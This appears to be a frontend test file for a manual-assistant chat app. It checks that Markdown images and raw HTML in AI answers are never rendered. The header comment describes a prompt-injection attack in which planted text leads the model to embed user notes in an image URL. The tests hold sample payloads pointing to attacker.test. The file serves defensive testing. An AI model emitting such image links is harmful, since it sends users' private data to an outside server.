/**
 * Codex review S6 — an AI answer never loads an image.
 *
 * The answer is rendered as Markdown, and Markdown can name an image by URL.
 * The browser fetches that URL the moment the answer renders, with no tap — so
 * a manual (or a web snippet) that talks the model into writing
 * `![x](https://elsewhere/?d=…your notes…)` would send whatever the model put
 * in that address to a stranger's server. The app's own CSP allows images from
 * any https host, so nothing else stops it.
 *
 * Images in answers are not a feature (the app shows manual pages through its
 * own viewer), so no image element is rendered at all: the alt text stands in
 * its place. Links are untouched — following one takes a tap.
 */
import { describe, expect, it } from "vitest"
import { render, screen } from "@testing-library/react"

const { ChatMessageBubble } = await import("./ChatMessageBubble")

const answer = (content: string, over: Record<string, unknown> = {}) =>
  render(<ChatMessageBubble message={{ id: "a1", role: "assistant" as const, content, ...over }} />)
const LEAK = "https://attacker.test/pixel.png?d=warranty+ends+2027+note+spare+key+under+mat"

describe("images in an AI answer", () => {
  it("an inline image is not rendered — nothing is fetched — and its alt text is shown instead", () => {
    const { container } = answer(`Here is the diagram: ![filter housing diagram](${LEAK})`)

    expect(container.querySelector("img")).toBeNull()
    expect(container.innerHTML).not.toContain("attacker.test")
    expect(screen.getByText(/filter housing diagram/)).toBeInTheDocument()
    expect(screen.getByText(/Here is the diagram:/)).toBeInTheDocument()
  })

  it("an image with no alt text leaves nothing behind", () => {
    const { container } = answer(`Run the descale cycle monthly. ![](${LEAK})`)

    expect(container.querySelector("img")).toBeNull()
    expect(container.innerHTML).not.toContain("attacker.test")
    expect(screen.getByText(/Run the descale cycle monthly\./)).toBeInTheDocument()
  })

  it("a reference-style image is not rendered either", () => {
    const { container } = answer(`See ![the part][p].\n\n[p]: ${LEAK}`)

    expect(container.querySelector("img")).toBeNull()
    expect(container.innerHTML).not.toContain("attacker.test")
  })

  it("an image wrapped in a link keeps the link (a tap) and drops the image (a fetch)", () => {
    const { container } = answer(`[![manual cover](${LEAK})](https://www.bosch-home.com/manuals)`)

    expect(container.querySelector("img")).toBeNull()
    expect(container.innerHTML).not.toContain("attacker.test")
    expect(screen.getByRole("link", { name: "manual cover" })).toHaveAttribute("href", "https://www.bosch-home.com/manuals")
  })

  it("raw HTML in the answer is never turned into elements", () => {
    const { container } = answer(`Done. <img src="${LEAK}"> <iframe src="${LEAK}"></iframe>`)

    expect(container.querySelector("img")).toBeNull()
    expect(container.querySelector("iframe")).toBeNull()
  })

  it("holds while the answer is still streaming in", () => {
    const { container } = answer(`Looking… ![x](${LEAK})`, { isStreaming: true })
    expect(container.querySelector("img")).toBeNull()
  })

  it("links still work", () => {
    answer("Order the filter from [Bosch](https://www.bosch-home.com/filters).")
    expect(screen.getByRole("link", { name: "Bosch" })).toHaveAttribute("href", "https://www.bosch-home.com/filters")
  })
})
